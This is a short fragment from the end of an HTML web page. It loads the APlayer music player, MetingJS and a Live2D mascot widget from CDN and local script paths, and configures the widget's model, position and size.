+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
